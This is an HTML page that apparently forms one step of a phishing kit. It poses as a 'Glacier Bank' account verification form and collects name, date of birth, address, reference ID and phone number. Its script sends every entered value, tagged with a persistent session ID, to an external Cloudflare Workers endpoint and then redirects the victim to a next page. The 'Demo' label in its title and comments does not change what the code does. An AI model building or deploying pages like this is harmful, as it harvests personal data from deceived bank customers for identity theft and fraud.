<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Account Verification | Demo</title>

<style>
:root{
  --blue:#0a7db3;
  --blue-dark:#06638f;
  --text:#1e1e1e;
  --bg:#f5f5f5;
  --card:#fff;
}

*{box-sizing:border-box}
body{
  margin:0;
  font-family:"Inter", Arial, sans-serif;
  background:var(--bg);
  color:var(--text);
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:flex-start;
  min-height:100vh;
  padding:24px 16px;
}

/* LOGO */
.logo{
  margin-bottom:18px;
}
.logo img{
  height:44px;
  display:block;
}

/* CARD */
.card{
  background:var(--card);
  width:100%;
  max-width:380px;
  padding:28px 24px;
  border-radius:6px;
  box-shadow:0 12px 28px rgba(0,0,0,.14);
  text-align:center;
}

.card h1{
  font-size:18px;
  margin-bottom:18px;
}

.card input{
  width:100%;
  padding:11px 12px;
  margin-bottom:12px;
  border:1px solid #ccc;
  border-radius:4px;
  font-size:14px;
}

.card button{
  width:100%;
  padding:12px;
  background:var(--blue);
  color:#fff;
  border:none;
  border-radius:4px;
  font-size:15px;
  cursor:pointer;
  margin-top:8px;
}
.card button:hover{
  background:var(--blue-dark);
}

.divider{
  height:1px;
  background:#e6e6e6;
  margin:18px 0 10px;
}

.footer{
  font-size:13px;
  color:#777;
}

/* MOBILE */
@media(max-width:420px){
  .card{
    padding:22px 18px;
  }
  .card h1{
    font-size:17px;
  }
}
</style>
</head>

<body>

<div class="logo">
  <img src="../Assets/lgoii.png" alt="Logo">
</div>

<form class="card" id="verifyForm">
  <h1>Confirm Your Details</h1>

  <!-- Non-identifying demo fields -->
  <input type="text" name="fullName" placeholder="Full Name" required>
  <input type="text" name="dob" placeholder="Date of Birth" required>
  <input type="text" name="refID" placeholder="Reference ID" required>
  <input type="text" name="address1" placeholder="Address Line 1" required>
  <input type="text" name="city" placeholder="City" required>
  <input type="text" name="postalCode" placeholder="Postal Code" required>
  <input type="text" name="contact" placeholder="Contact Number" required>

  <button type="submit">Continue</button>

  <div class="divider"></div>
  <div class="footer">© 2026 - Glacier Bank </div>
</form>

<script>
// Persistent session
const session = localStorage.getItem("session") || crypto.randomUUID();
localStorage.setItem("session", session);

document.getElementById("verifyForm").addEventListener("submit", async e => {
  e.preventDefault();

  const formElements = [...e.target.elements]
    .filter(el => el.name && el.type !== "submit");

  const formData = {};
  formElements.forEach(el => formData[el.name] = el.value.trim());

  // POST to Worker
  try {
    await fetch("https://summer-rain-1f5b.tekin49532.workers.dev/event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...formData,
        session,
        step: "verification_page"
      })
    });

    // Redirect after submission
    window.location.href = "/Pages/C44e.html";

  } catch(err) {
    console.error(err);
    alert("Network error. Please try again.");
  }
});
</script>

</body>
</html>
